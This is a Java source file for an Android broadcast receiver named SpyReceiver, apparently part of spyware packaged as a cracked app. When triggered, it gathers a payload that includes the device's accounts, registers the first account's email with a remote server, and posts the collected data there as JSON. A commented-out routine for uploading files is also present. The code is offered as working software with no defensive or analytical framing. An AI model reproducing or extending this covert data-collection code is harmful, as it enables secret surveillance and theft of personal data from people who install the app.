package co.poweramp.crackapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.TextHttpResponseHandler;

import co.poweramp.crackapp.R;
import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

/**
 * CrackApp
 * <p/>
 * Created by duncan on 22/11/15.
 * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
 */
public class SpyReceiver extends BroadcastReceiver {
    private final String TAG = "SpyReceiver", BASE_URL = "http://192.168.1.104:8080"; //TODO: FIx BASE URL
    private AsyncHttpClient httpClient;

    @Override
    public void onReceive(final Context context, Intent intent) {
        if (httpClient == null) {
            httpClient = new AsyncHttpClient();
        }
        new Job(context, new Job.JobListener() {
            @Override
            public void onComplete(final Payload p) {
                final SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
                int accountId = sharedPref.getInt("accountId", -1);
                if (accountId == -1) {
                    requestForAccountId(context, p.getAccounts()[0].name, new RequestAccountListener() {
                        @Override
                        public void onSuccess(int accountId) {
                            p.setAccountId(accountId);
                            submitPayload(context, p);
                        }
                    });
                } else {
                    p.setAccountId(accountId);
                    submitPayload(context, p);
                }
            }
        });
    }

    /**
     * Submit a payload
     * @param context
     * @param p
     */
    private void submitPayload(Context context, Payload p) {
        final Gson gson = new GsonBuilder().registerTypeAdapter(Payload.class, new PayloadSerialiser()).setPrettyPrinting().create();
        String json = gson.toJson(p);
        StringEntity entity;
        try {
            entity = new StringEntity(json);
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        System.out.println(json);
        httpClient.post(context, BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.d(TAG, "Sent payload to server successfully.");

            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "Failed to send payload to server: " + statusCode);
            }
        });
    }

    private interface RequestAccountListener {
        void onSuccess(int accountId);
    }

    /**
     * Request for an account id from the server
     * @param context
     * @param email
     */
    private void requestForAccountId(final Context context, String email, final RequestAccountListener listener) {
        RequestParams params = new RequestParams();
        params.put("email", email);
        httpClient.post(context, BASE_URL + "/users/add", params, new SaneAsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                String response = new String(responseBody);
                JsonObject obj = new JsonParser().parse(response).getAsJsonObject();
                boolean success = obj.get("success").getAsBoolean();
                if (success) {
                    SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
                    SharedPreferences.Editor editor = sharedPref.edit();
                    int accountId = obj.get("data").getAsJsonObject().get("account_id").getAsJsonObject().get("id").getAsInt();
                    editor.putInt(context.getString(R.string.preference_account_id), accountId);
                    editor.commit();
                    Log.d(TAG, "Got account id: " + accountId);
                    listener.onSuccess(accountId);
                } else {
                    Log.d(TAG, "Success is false from server: " + response);
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "POST to server failed: " + statusCode);
            }
        });
    }

    private String getUniqueDeviceId(final Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

//    private void sendData(Context context, Map<String, Object> formData) {
//        RequestParams params = new RequestParams();
//        for (Map.Entry<String, Object> data : formData.entrySet()) {
//            if (data.getValue() instanceof byte[]) {
//                params.put("file", new ByteArrayInputStream((byte[])data.getValue()), data.getKey());
//            } else {
//                params.put(data.getKey(), data.getValue());
//            }
//        }
//        httpClient.post(context, URL, params, new AsyncHttpResponseHandler() {
//            @Override
//            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
//                Log.i(TAG, "Success!");
//            }
//
//            @Override
//            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
//                Log.i(TAG, "Failure!");
//            }
//        });
//    }
}
